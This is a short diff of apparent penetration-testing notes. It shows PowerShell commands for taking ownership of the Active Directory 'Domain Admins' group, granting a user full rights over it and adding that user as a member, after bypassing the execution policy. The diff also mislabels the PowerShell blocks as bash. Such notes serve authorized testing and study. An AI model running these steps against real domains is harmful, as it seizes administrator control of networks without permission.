@@ -105,16 +105,17 @@ Get-Command Set-DomainObjectOwner, Add-DomainObjectAcl
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 ```
-```bash
+
 - 1. Take ownership
-```powershell
+```bash
 Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usermad" -Verbose
 ```
 - 2. Grant yourself GenericAll
-```powershell
+```bash
 Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "usermad" -Rights All -Verbose
 ```
-```powershell
+
 - 3. Add to group
+```bash
 Add-DomainGroupMember -Identity "Domain Admins" -Members "usermad" -Verbose
 ```
